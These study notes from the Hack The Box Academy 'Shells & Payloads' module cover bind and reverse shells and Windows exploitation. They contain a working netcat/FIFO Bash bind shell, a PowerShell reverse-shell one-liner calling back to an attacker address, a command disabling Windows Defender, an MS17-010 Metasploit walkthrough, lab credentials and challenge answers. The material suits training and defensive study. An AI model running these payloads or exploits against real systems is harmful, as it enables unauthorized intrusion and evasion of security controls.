# HTB Academy: Shells & Payloads

> Engagement-ready study notes for authorized Hack The Box labs and assessments only. Every later section should add exact commands, direction, verification, troubleshooting, detection considerations, and cleanup when those elements are actually taught.

## Module information

- **HTB module:** Shells & Payloads
- **Penetration Tester path module:** 8
- **Total sections:** 17
- **Current detailed progress:** Sections 1, 4, 5, and 9 / 17
- **Primary goal:** Understand how payloads produce shell access and how shells become the command-line foothold used for later assessment work.

---

## 1. Shells Jack Us In, Payloads Deliver Us Shells

### Section objective

Understand the difference between a **shell** and a **payload**, why obtaining a shell matters during a penetration test, and how the word *shell* changes slightly across computing, exploitation, and web contexts.

### Core mental model

```text
Enumerate target -> identify weakness -> deliver payload -> establish shell -> perform authorized follow-up work
```

The payload is what performs the intended action. A shell is the command interface obtained when that action successfully grants interactive or command-execution access.

### What is a shell?

A **shell** is a program that accepts instructions from a user and displays textual output from the operating system.

Common examples include:

| Operating environment | Shell examples |
|---|---|
| Linux and Unix-like systems | Bash, Zsh |
| Windows | Command Prompt (`cmd`), PowerShell |

In an ordinary administration context, the user opens a shell locally or through an approved remote-management service. In an exploitation context, a security tester may obtain access to a shell after successfully exploiting a vulnerability or bypassing a security restriction within the authorized scope.

Phrases such as these generally mean that command access was obtained:

- “I caught a shell.”
- “I popped a shell.”
- “I dropped into a shell.”
- “I’m in.”

These phrases do not describe the shell's privilege level, reliability, user identity, or scope. Those conditions still need to be established and documented.

### Why obtain a shell?

A shell exposes the operating system's command-line interface and can allow the tester to interact with system commands and the filesystem. Depending on authorization and privileges, it can support:

- Local system enumeration
- Privilege-escalation assessment
- File transfer
- Network pivoting
- Evidence collection and documentation
- Use of command-line assessment tools
- Persistence testing when explicitly authorized

A shell is normally a **foothold**, not the end of the assessment. The tester must determine what access was obtained, which actions are permitted next, and which actions would exceed the rules of engagement.

### Three shell perspectives

| Perspective | Meaning | Example |
|---|---|---|
| Computing | A text-based environment used to administer a computer and submit instructions | Bash, Zsh, `cmd`, PowerShell |
| Exploitation and security | Command access obtained after exploiting a weakness or bypassing a security control | Triggering a vulnerable Windows service and obtaining Command Prompt access |
| Web | A server-side script or application endpoint that accepts commands and interacts with the underlying host | An uploaded script that reads files or executes commands when requested through a browser |

### Web shell distinction

A web shell differs from an ordinary interactive shell:

- It commonly begins as a server-side script placed through an upload or application vulnerability.
- Commands may be submitted through an HTTP request or browser rather than an interactive terminal.
- Its capabilities depend on the web-server account and application environment.
- It may provide command execution, file access, or destructive capabilities.
- Uploading or executing one is permitted only when the lab or written assessment scope explicitly allows it.

### What is a payload?

The word **payload** has different meanings depending on context:

| Context | Meaning |
|---|---|
| Networking | The data carried inside a packet after protocol headers are excluded |
| Basic computing | The portion of an instruction that identifies the action to perform |
| Programming | Data carried or referenced by an instruction or data structure |
| Exploitation and security | Code designed to perform an action after a vulnerability is triggered, such as establishing authorized shell access in a lab |

Within this module, a payload is primarily the code or instruction set used to establish access or perform a post-exploitation action against an authorized vulnerable system.

### Shell versus payload

| Item | Question it answers |
|---|---|
| Payload | **What code or action is delivered to the target?** |
| Shell | **What command interface or access results from that action?** |

A payload does not always produce a shell. It may perform another action. Likewise, a shell is the resulting access interface, not the delivery code itself.

### Engagement checkpoint after obtaining a shell

Before taking further action, record and confirm:

| Check | Why it matters |
|---|---|
| Target identity | Confirms the shell belongs to the in-scope system |
| Operating system and shell type | Determines which syntax and tools are appropriate |
| Current user and privilege level | Establishes what the session can access |
| Access method | Documents the vulnerability, payload, and connection path |
| Session stability | Identifies whether the shell is interactive, limited, or likely to terminate |
| Allowed next steps | Prevents unauthorized persistence, pivoting, collection, or disruption |
| Evidence timestamp | Supports reproduction and final reporting |

### Operational boundaries

Obtaining shell access does not automatically authorize every possible follow-up action. Treat these as separate scope decisions:

- Privilege escalation
- Credential access
- Persistence
- Pivoting into another network
- Collection or exfiltration of client data
- Destructive commands or service interruption

Use dummy data where possible, minimize access to sensitive information, and preserve a tester activity log.

### Commands and hands-on exercise

Section 1 is conceptual and provides no target, payload command, listener command, or interactive exercise. Do not invent an exploitation workflow from this introduction. Later sections will add commands and labs when HTB introduces the relevant shell type, listener, payload, or delivery technique.

### Verification of understanding

You understand this section when you can explain:

1. A shell accepts commands and returns operating-system output.
2. A payload is the delivered code or action; it may produce a shell.
3. Shell access is a foothold that enables later authorized assessment activities.
4. Computing, exploitation, and web contexts use the word *shell* differently.
5. Obtaining access does not remove the rules-of-engagement boundary.

### Key takeaways

- Shells provide command-line access to the operating system.
- Payloads carry out actions and may deliver shell access.
- A shell is the beginning of post-exploitation work, not automatic permission for every action.
- Command-line proficiency makes assessment work faster and easier to automate.
- Later module sections will provide the concrete listeners, payloads, and shell-handling procedures.

---

## 4. Bind Shells

### Section objective

Understand bind-shell connection direction, distinguish a raw Netcat TCP session from a real shell, and establish a basic Bash bind shell inside the authorized HTB target.

### Connection direction

```text
Attack box (client) --> Target listener (server) --> Target shell
```

With a bind shell, the target opens a listening port. The attack box connects directly to the target's IP address and listening port.

| Role | System | Responsibility |
|---|---|---|
| Server/listener | Target | Opens a port and ultimately exposes its shell |
| Client/connector | Pwnbox | Connects to the target's IP and listening port |

### Why bind shells are difficult in real networks

- A listener must already be running on the target or the tester must find an authorized way to start one.
- Edge firewalls and NAT usually restrict unsolicited inbound connections.
- Windows and Linux host firewalls commonly block unexpected listening applications and ports.
- The tester must know or reach the target's listening address and port.
- A new inbound listener is comparatively easy for defenders to detect and block.

### Netcat option reference

| Option | Meaning |
|---|---|
| `-l` | Listen for an inbound connection |
| `-v` | Produce verbose connection information |
| `-n` | Do not perform DNS resolution |
| `-p PORT` | Select the local listening port |
| `TARGET_IP PORT` | Connect to the target address and port |

### Stage 1: practice a raw Netcat session

SSH to the HTB Linux target:

```bash
ssh htb-student@TARGET_IP
```

Use the lab password supplied by HTB:

```text
HTB_@cademy_stdnt!
```

On the target, start a listener:

```bash
nc -lvnp 7777
```

On the Pwnbox, connect to it:

```bash
nc -nv TARGET_IP 7777
```

Type a harmless test message on the Pwnbox:

```text
Hello Academy
```

The target receives the same text. This proves bidirectional TCP communication, but it is **not yet a shell** because the connection is not attached to Bash or another command interpreter.

### Stage 2: establish the Bash bind shell

On the target, run HTB's bind-shell payload:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET_IP 7777 > /tmp/f
```

Replace `TARGET_IP` with the target's Academy address.

#### Payload breakdown

| Component | Purpose |
|---|---|
| `rm -f /tmp/f` | Remove a stale FIFO from a previous attempt |
| `mkfifo /tmp/f` | Create a named pipe used to pass input back into the shell |
| `cat /tmp/f` | Read commands arriving through the named pipe |
| `/bin/bash -i` | Start an interactive Bash shell |
| `2>&1` | Merge standard error into standard output |
| `nc -l TARGET_IP 7777` | Listen on the target address and TCP/7777 |
| `> /tmp/f` | Feed commands received by Netcat into the named pipe |

The pipeline forms a loop:

```text
Pwnbox command -> Netcat -> FIFO -> Bash -> command output -> Netcat -> Pwnbox
```

On the Pwnbox, connect:

```bash
nc -nv TARGET_IP 7777
```

Successful output should include a target prompt resembling:

```text
Target@server:~$
```

### Verify the bind shell

From the Pwnbox's new shell session, run:

```bash
whoami
hostname
pwd
```

For the HTB challenge, retrieve the required flag:

```bash
cat /customscripts/flag.txt
```

Submit the displayed flag to HTB. Do not save flags in the public GitHub repository.

### Challenge answers

**Question 1:** If the target runs `nc -lvnp 443`, connect to:

```text
443
```

**Question 2:** Establish the bind shell and submit the output of:

```bash
cat /customscripts/flag.txt
```

### Troubleshooting

| Symptom | Likely cause | Check or resolution |
|---|---|---|
| `Connection refused` | Listener is not active or wrong port | Restart the target listener and confirm TCP/7777 |
| Connection hangs or times out | Firewall, routing, or wrong IP | Confirm the Academy target address and network connection |
| Text transfers but commands do not execute | Only a raw Netcat session was created | Start the complete FIFO/Bash payload |
| `Address already in use` | Another process owns the port | Stop the old listener or use the lab's approved port |
| FIFO-related errors | `/tmp/f` remains from an earlier attempt | The payload begins with `rm -f /tmp/f` |
| Shell has no polished prompt or job control | Basic Netcat shell limitations | Expected for this introductory exercise |

### Detection and operational notes

- The target opens a new inbound listening socket.
- Host and network firewalls may block the connection.
- Process telemetry can show Netcat, Bash, `mkfifo`, and the pipeline.
- Network monitoring can see an unencrypted interactive command channel.
- Using TCP/443 does not make Netcat traffic HTTPS or encrypted.

### Cleanup

Exit or terminate the lab shell, stop the listener with `Ctrl+C`, and remove the named pipe on the target:

```bash
rm -f /tmp/f
```

---

## 5. Reverse Shells

### Section objective

Understand reverse-shell direction and establish an authorized PowerShell reverse shell from the Windows HTB target back to a Netcat listener on the Pwnbox.

### Connection direction

```text
Target (client) --> Pwnbox listener (server) --> Remote target shell
```

The attack box listens. The target initiates the outbound connection and attaches its command interpreter to that connection.

| Role | System | Responsibility |
|---|---|---|
| Server/listener | Pwnbox | Waits for and receives the shell connection |
| Client/connector | Windows target | Runs the payload and connects back to the Pwnbox |

### Why reverse shells are commonly used

- Outbound target connections may be allowed when unsolicited inbound connections are blocked.
- The Pwnbox does not need to connect directly to a new listening port on the target.
- The payload can use tools already present on the target, such as PowerShell.

This does not make a reverse shell invisible. Deep packet inspection, endpoint protection, PowerShell logging, EDR, and egress filtering can still detect or block it.

### Values to collect

Find the Pwnbox VPN address:

```bash
ip -br addr show tun0
```

Use the `tun0` address as `PWNBOX_IP`. Do not use the target IP or a public/local Ethernet address in the callback payload.

### Step 1: start the Pwnbox listener

```bash
sudo nc -lvnp 443
```

| Option | Meaning |
|---|---|
| `sudo` | Required because TCP/443 is a privileged port on Linux |
| `-l` | Listen mode |
| `-v` | Verbose connection information |
| `-n` | Disable DNS lookups |
| `-p 443` | Listen on TCP/443 |

Port 443 is normally associated with HTTPS, but a raw Netcat listener does not provide TLS encryption and is not automatically trusted by firewalls capable of inspecting application traffic.

### Step 2: connect to the Windows target

Use the RDP credentials given by HTB:

```text
Username: htb-student
Password: HTB_@cademy_stdnt!
```

From Pwnbox, the connection pattern is:

```bash
xfreerdp /v:TARGET_IP /u:htb-student /p:'HTB_@cademy_stdnt!'
```

### Step 3: run the PowerShell reverse-shell payload

Open Command Prompt on the Windows target and run the HTB payload after replacing `PWNBOX_IP`:

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('PWNBOX_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Payload breakdown

| Component | Purpose |
|---|---|
| `powershell -nop -c` | Start PowerShell without loading a profile and execute the supplied command |
| `TCPClient('PWNBOX_IP',443)` | Connect from the target to the Pwnbox listener |
| `GetStream()` | Access the network stream |
| `$stream.Read(...)` | Wait for commands sent by the Pwnbox |
| `ASCIIEncoding.GetString(...)` | Decode received command bytes |
| `iex $data` | Execute the received PowerShell command |
| `2>&1 | Out-String` | Capture command output and errors as text |
| `$stream.Write(...)` | Return the output to the Pwnbox |
| `$client.Close()` | Close the connection when the loop ends |

### Security-control behavior shown by HTB

Windows Defender may block the payload and report:

```text
This script contains malicious content and has been blocked by your antivirus software.
```

That block is a successful defensive control. HTB demonstrates disabling real-time monitoring in an **administrative PowerShell console** for its disposable lab:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

This command changes a security control. Use it only on the isolated HTB target when the exercise explicitly permits it. Do not disable endpoint protection on personal, university, client, or production systems without explicit written authorization.

After the lab, restore the setting:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

### Step 4: verify the reverse shell

The Pwnbox listener should report an inbound connection and display a PowerShell prompt. Run:

```powershell
whoami
hostname
Get-Location
```

For the HTB challenge, submit the output of:

```powershell
hostname
```

Do not publish the live challenge answer in the GitHub notes.

### Challenge answers

**Question 1:** During a reverse shell, the target acts as the:

```text
client
```

**Question 2:** Establish the reverse shell and submit the target's hostname from:

```powershell
hostname
```

### Troubleshooting

| Symptom | Likely cause | Check or resolution |
|---|---|---|
| No connection reaches Pwnbox | Wrong callback IP | Use the Pwnbox `tun0` address |
| `Access denied` when binding port 443 | Listener lacks privileges | Run Netcat with `sudo` |
| Defender blocks the payload | Endpoint protection recognized it | Record the block; follow only HTB's authorized lab instructions |
| Payload runs but no callback arrives | Listener not started or outbound path blocked | Start listener first and confirm IP/port |
| Clipboard paste fails in RDP | Browser/RDP clipboard handling | Paste into Notepad inside the target, then copy into Command Prompt |
| Session closes immediately | Payload typo or connection interruption | Recheck quotes, IP, listener, and network state |

### Detection and reporting notes

- PowerShell and Script Block logging can capture the payload.
- AMSI and Defender may detect the command before execution.
- EDR can correlate `cmd.exe` spawning PowerShell with an outbound socket.
- Network controls can detect non-TLS traffic on TCP/443.
- Record both successful defensive blocks and successful callbacks as assessment evidence.

### Cleanup

1. Exit the remote PowerShell session or stop the Pwnbox listener with `Ctrl+C`.
2. Restore Defender if the HTB exercise required disabling it:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

3. Close the RDP session and remove only test artifacts created during the lab.

### Bind versus reverse shell quick comparison

| Property | Bind shell | Reverse shell |
|---|---|---|
| Listener runs on | Target | Pwnbox |
| Connection initiated by | Pwnbox | Target |
| Target's network role | Server | Client |
| Common obstacle | Inbound firewall/NAT | Outbound filtering/EDR |
| Pwnbox Netcat action | Connect | Listen |

---

## Related notes

- [Original complete-path Shells & Payloads summary](complete-path-study-pack/knowledge-base/08-shells-payloads.md)
- [HTB section engagement runbook template](../../../templates/htb-section-runbook-template.md)

---

## 9. Infiltrating Windows — Payload Generation and Delivery

### Section objective

Recognize Windows targets, choose a payload format that fits the delivery path, identify generation and transfer resources, validate a suspected vulnerability, configure the exploit and payload correctly, obtain a shell in an authorized HTB lab, and identify whether the resulting native shell is Command Prompt or PowerShell.

> Use these procedures only inside an authorized assessment or lab. Confirm the target, scope, maintenance constraints, and callback address before running an exploit.

### Engagement workflow

```text
Confirm scope
  -> fingerprint the target
  -> enumerate exposed services
  -> select a plausible vulnerability
  -> validate without exploiting
  -> choose exploit and payload
  -> configure RHOSTS/LHOST/LPORT
  -> execute
  -> verify identity and shell type
  -> collect only authorized evidence
  -> clean up and document
```

### Why Windows matters

Windows remains common in home and enterprise environments and is closely tied to Active Directory, cloud services, Windows Subsystem for Linux, and other Microsoft infrastructure. Its broad deployment and feature set create a large attack surface. Historical Windows flaws also show why patching, protocol hardening, network segmentation, and credential protection are essential.

### Prominent Windows vulnerabilities

| Name | Identifier | Main component or weakness | Security significance |
|---|---|---|---|
| MS08-067 | MS08-067 | Windows Server service / SMB-related remote-code-execution flaw | Used by Conficker and also leveraged by Stuxnet; affected multiple Windows versions. |
| EternalBlue | MS17-010 | SMBv1 remote code execution | Leaked in the Shadow Brokers release and used by WannaCry and NotPetya. |
| PrintNightmare | CVE-2021-34527 and related issues | Windows Print Spooler | Can lead to remote code execution or privilege escalation under affected configurations. |
| BlueKeep | CVE-2019-0708 | Remote Desktop Services | Pre-authentication remote code execution affecting older Windows systems. |
| SIGRed | CVE-2020-1350 | Windows DNS server handling of SIG records | Critical remote code execution risk, especially serious when DNS runs on a domain controller. |
| SeriousSAM / HiveNightmare | CVE-2021-36934 | Overly permissive access to registry hive data and shadow copies | Could expose SAM and other sensitive credential material to a local low-privilege user. |
| Zerologon | CVE-2020-1472 | Netlogon cryptographic flaw | Could allow an attacker with network access to compromise a domain controller in vulnerable environments. |

Do not assume a host is exploitable merely because its operating-system version falls into an affected range. Confirm patch state and use an appropriate non-destructive check first.

## Windows fingerprinting

### 1. ICMP TTL clue

A Windows host commonly begins with a TTL such as `128` or, on some systems, `32`. The observed value may be lower because each router hop normally decrements it. TTL is therefore a clue, not proof.

```bash
ping TARGET_IP
```

Look for a reply containing a value near `ttl=128`, then corroborate it with service and OS evidence.

### 2. Nmap OS detection

```bash
sudo nmap -v -O TARGET_IP
```

Important output fields include:

- `Running`
- `OS CPE`
- `OS details`
- Windows-associated ports such as TCP `135`, `139`, and `445`

If host discovery prevents useful results, HTB suggests testing an authorized target with additional options such as `-Pn` and, where appropriate, `-A`:

```bash
sudo nmap -Pn -A TARGET_IP
```

`-Pn` skips normal host discovery and treats the target as online. `-A` enables several intrusive enumeration features, so use it only when the rules of engagement permit them.

### 3. Banner enumeration

```bash
sudo nmap -v TARGET_IP --script banner.nse
```

The banner script attempts to collect identifying text from open services. Treat banners as evidence to corroborate, because services can be proxied, altered, or intentionally misleading.

### Fingerprinting evidence checklist

| Evidence | What it can suggest | Limitation |
|---|---|---|
| TTL near 128 | Likely Windows initial TTL | Routers decrement TTL; other systems can be configured similarly. |
| TCP 135/139/445 | RPC, NetBIOS, and SMB commonly associated with Windows | These services may also appear on non-Windows systems. |
| Nmap OS CPE/details | TCP/IP-stack-based OS estimate | Firewalls and filtered probes reduce accuracy. |
| SMB OS discovery | Windows edition, build, hostname, workgroup/domain clues | Requires reachable SMB and may be restricted. |
| Service banner | Product and protocol clues | Banners may be incomplete or deceptive. |

Use more than one method before making an OS determination.

## Windows payload formats

The delivery mechanism should influence the payload format. A format that executes cleanly through one path may be unsuitable for another.

| Format | Purpose and behavior | Typical authorized-testing use |
|---|---|---|
| DLL | Shared Windows library containing code and data used by processes | Test DLL search-order hijacking, vulnerable library loading, or another explicitly scoped DLL execution path. |
| `.bat` | Text-based DOS/Command Prompt script | Automate native commands, enumeration, or a controlled connection sequence. |
| `.vbs` | VBScript executed by Windows Script Host | Assess a script-based delivery or execution path where VBScript is present and permitted. |
| `.msi` | Windows Installer package | Test installation and `msiexec` execution paths, including their privilege context. |
| PowerShell script | `.NET`-based scripting and administration | Use cmdlets, modules, object-oriented output, and authorized automation. |

### Quick answer

The text-based DOS script file type asked for in Question 1 is:

```text
.bat
```

## Payload Generation

These are the payload-generation resources named by HTB. The source links are preserved here so the notes remain usable during an engagement.

| Resource | Source | What it provides |
|---|---|---|
| MSFvenom and Metasploit Framework | [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework) | Cross-platform payload generation, vulnerability checks, exploit modules, handlers, and post-exploitation modules. |
| Payloads All The Things | [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Payload examples, command references, and methodology cheat sheets. |
| Mythic C2 Framework | [its-a-feature/Mythic](https://github.com/its-a-feature/Mythic) | A command-and-control framework with extensible agents and payload-generation support. |
| Nishang | [samratashok/nishang](https://github.com/samratashok/nishang) | Offensive PowerShell scripts and utilities for authorized security testing. |
| Darkarmour | [bats3c/darkarmour](https://github.com/bats3c/darkarmour) | A historical tool for generating obfuscated Windows binaries; verify maintenance status and laboratory compatibility before use. |

### Payload-selection checklist

Before generating anything, answer these questions:

1. What operating system and architecture does the target use?
2. Which execution path is actually available?
3. Does the payload need to be staged or self-contained?
4. Which local interface and port can receive the callback?
5. Will the selected format survive the transfer mechanism?
6. Does execution require user interaction, elevated privileges, or a specific runtime?
7. Is the action explicitly permitted by the engagement scope?

## Payload transfer and execution resources

| Method | Direction or role | Why it is useful | Important constraint |
|---|---|---|---|
| Impacket | Pwnbox to or through Windows network services | Provides Python tools for SMB, WMI, Kerberos, remote execution, file access, and temporary SMB hosting. | Requires reachable services and, for many actions, valid authorization or credentials. |
| SMB shares | Either direction | Windows-native file sharing; administrative shares such as `C$` and `ADMIN$` may support authorized administration. | Authentication, share permissions, SMB signing, and network controls matter. |
| Metasploit exploit modules | Payload generation, staging, handler, and execution | Many modules can build, deliver, execute, and receive a payload in one workflow. | Module options must match the exact target and callback path. |
| HTTP/S | Either direction | Frequently reachable and easy to host or request files through. | HTTPS protects transport only when certificate validation and server trust are handled correctly. |
| FTP/TFTP | Either direction | May be available on legacy or specialized systems. | Often unencrypted; credentials and file contents may be exposed. |
| Payloads All The Things | Reference | Provides transfer one-liners and methodology examples. | Adapt commands to the scoped environment; do not execute unreviewed code blindly. |

## HTB example compromise walkthrough

This walkthrough records the lab process taught in the section. Replace every example address with the current HTB target and your current VPN/Pwnbox address.

### Variables

```text
TARGET_IP=<HTB target address>
PWNBOX_IP=<your tun0 address>
CALLBACK_PORT=4444
```

Find the Pwnbox VPN address with:

```bash
ip -br address show tun0
```

### Step 1 — Enumerate the target

HTB's example uses:

```bash
nmap -v -A TARGET_IP
```

Record:

- Windows version/build estimate
- Hostname
- Domain or workgroup
- Open ports
- Service names and versions
- SMB security information
- Web-server details

In the example, TCP `80`, `135`, `139`, and `445` were open; the target appeared to be Windows Server 2016; and SMB was exposed.

### Step 2 — Validate MS17-010 with the auxiliary scanner

Start Metasploit:

```bash
msfconsole
```

Then configure the scanner:

```text
use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS TARGET_IP
run
```

Interpretation:

- `RHOSTS` is the remote target or targets being checked.
- `RPORT` defaults to SMB on TCP `445` in this module.
- A result such as `Host is likely VULNERABLE` is a strong indicator, not permission to exceed scope.
- Stop if the target is not the authorized HTB machine or the module's behavior is not allowed.

### Step 3 — Select the exploit

Search the installed modules:

```text
search eternal
```

HTB's walkthrough selects:

```text
use exploit/windows/smb/ms17_010_psexec
```

Do not rely on a search-result number such as `use 2`; module ordering can change between Metasploit versions. Use the full module name in engagement notes.

### Step 4 — Configure exploit and payload

```text
show options
set RHOSTS TARGET_IP
set LHOST PWNBOX_IP
set LPORT 4444
show options
```

The walkthrough uses the default payload:

```text
windows/meterpreter/reverse_tcp
```

If it is not already selected, set it explicitly:

```text
set PAYLOAD windows/meterpreter/reverse_tcp
```

#### Meaning of the critical settings

| Setting | Meaning | Common mistake |
|---|---|---|
| `RHOSTS` | Remote target address | Entering the Pwnbox IP instead of the target. |
| `RPORT` | Remote service port, normally `445` here | Changing it when SMB is actually on the default port. |
| `LHOST` | Local callback/listener address reachable by the target | Using `127.0.0.1`, a Wi-Fi address, or the wrong VPN interface instead of `tun0`. |
| `LPORT` | Local port used by the reverse connection | Choosing a blocked or already occupied port. |
| `PAYLOAD` | Code and session type delivered after exploitation | Selecting a payload with the wrong platform or architecture. |

Before execution, inspect `show options` and make sure every required field is valid.

### Step 5 — Execute and verify the Meterpreter session

```text
exploit
```

When a session opens, verify its identity:

```text
getuid
sysinfo
```

HTB's example obtained:

```text
NT AUTHORITY\SYSTEM
```

Do not assume the privilege level; record the actual `getuid` result.

### Step 6 — Open and identify the native Windows shell

From Meterpreter:

```text
shell
```

Prompt recognition:

| Prompt | Shell |
|---|---|
| `C:\Windows\system32>` | Command Prompt (`cmd.exe`) |
| `PS C:\Windows\system32>` | PowerShell |

Useful verification commands in Command Prompt:

```cmd
whoami
hostname
cd
```

### Step 7 — Read the HTB flag

Question 3 places `flag.txt` at the root of `C:\`. From the native Windows shell:

```cmd
type C:\flag.txt
```

Submit the displayed value to HTB. Do not commit the flag value to the notes repository.

## Command Prompt versus PowerShell

| Characteristic | Command Prompt | PowerShell |
|---|---|---|
| Data model | Primarily text streams | `.NET` objects |
| Automation | Batch files and native DOS/Windows commands | Cmdlets, functions, scripts, modules, and pipelines |
| Compatibility | Available on old and current Windows versions | Not native to very old Windows versions; version and policy vary |
| Logging and visibility | Still observable through process, command-line, and security telemetry | Often creates richer PowerShell-specific telemetry and history |
| Typical choice | Simple native commands, batch workflows, older hosts | Structured administration, `.NET`, custom modules, and cloud services |

Use Command Prompt when:

- The target is old and may not include PowerShell.
- Only simple native commands or batch files are required.
- PowerShell execution policy or version limitations interfere with the intended authorized workflow.

Use PowerShell when:

- Cmdlets, modules, aliases, or custom scripts are needed.
- Structured `.NET` objects are more useful than plain text.
- The task involves modern Windows or cloud administration.

Neither shell is invisible. Modern endpoint and Windows logging can capture process creation, command lines, scripts, network connections, and related behavior.

## WSL and PowerShell Core considerations

- WSL provides a Linux userland on Windows and may expose Linux utilities and runtimes such as Python.
- PowerShell Core can run on Linux and carries many PowerShell concepts across platforms.
- Do not assume WSL or cross-platform PowerShell activity is absent from telemetry. Defensive visibility changes over time and depends on configuration.
- Enumerate the actual host and installed components instead of relying on historical detection assumptions.

## Verification checklist

- [ ] Target address matches the authorized HTB instance.
- [ ] Windows identification is supported by more than one clue.
- [ ] Open services and versions are recorded.
- [ ] The vulnerability is checked before exploitation.
- [ ] `RHOSTS` points to the target.
- [ ] `LHOST` points to the reachable Pwnbox/VPN interface.
- [ ] `LPORT` is available and allowed.
- [ ] Payload platform and architecture match the target.
- [ ] Session identity is verified with `getuid` or `whoami`.
- [ ] Native shell type is identified from the prompt and behavior.
- [ ] Only the minimum evidence required by the exercise is collected.
- [ ] The flag is submitted to HTB but never stored in public notes.

## Troubleshooting

| Symptom | Likely cause | Check or correction |
|---|---|---|
| Nmap reports the host as down | ICMP or discovery probes are filtered | Confirm the address and, if authorized, retry with `-Pn`. |
| OS detection is unclear | Insufficient open/closed ports or filtered probes | Combine TTL, service banners, SMB enumeration, and version evidence. |
| MS17-010 scanner returns no result | TCP 445 is closed/filtered, target is patched, or wrong address | Recheck scope, reachability, port state, and module settings. |
| Exploit has no session | Wrong `LHOST`, blocked callback, occupied `LPORT`, incompatible exploit/payload, or patched target | Verify `tun0`, routing, listener settings, target build, and module output. |
| Session opens and immediately dies | Payload instability, process termination, endpoint controls, or network interruption | Review module output, confirm target state, and retry only when the lab permits it. |
| `type C:\flag.txt` fails | Wrong shell, wrong path, or insufficient access | Run `whoami`, `cd`, and `dir C:\`; confirm the lab's current instructions. |

## Detection and defender observations

The section's workflow can create high-value telemetry, including:

- Scanning across many ports and Nmap probe signatures
- SMB vulnerability-check traffic
- Connections to TCP 445 from unusual systems
- Remote service creation or access to administrative shares
- PowerShell execution and script-block telemetry
- A reverse TCP connection from the target to the Pwnbox
- Meterpreter staging and process creation
- A process running as `NT AUTHORITY\SYSTEM`

Defenders should patch affected systems, disable SMBv1 where it is not required, restrict SMB exposure, monitor administrative shares and service creation, segment critical servers, and alert on unusual outbound callbacks.

## Cleanup and documentation

After the authorized lab activity:

1. Exit the native shell with `exit` to return to Meterpreter.
2. Exit the Meterpreter session when evidence collection is complete.
3. Stop Metasploit handlers and modules.
4. Remove only artifacts that the exercise caused and that the rules authorize you to remove.
5. Record the target, timestamp, module, payload, callback address, session identity, evidence, and cleanup result.
6. Never add credentials, flags, client data, or live payload binaries to the public notes repository.

## Section questions

| Question | Answer or procedure |
|---|---|
| Text-based DOS script file extension | `.bat` |
| Windows exploit included in the Shadow Brokers leak | `MS17-010` |
| Flag in `C:\flag.txt` | Gain the authorized HTB shell, run `type C:\flag.txt`, and submit the value only to HTB. |

## Fast engagement card

```text
# Fingerprint
ping TARGET_IP
sudo nmap -v -O TARGET_IP
sudo nmap -v TARGET_IP --script banner.nse

# Validate MS17-010 in Metasploit
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS TARGET_IP
run

# Configure HTB's example exploit
use exploit/windows/smb/ms17_010_psexec
set RHOSTS TARGET_IP
set LHOST PWNBOX_IP
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
show options
exploit

# Verify and read the exercise flag
getuid
sysinfo
shell
whoami
hostname
type C:\flag.txt
```
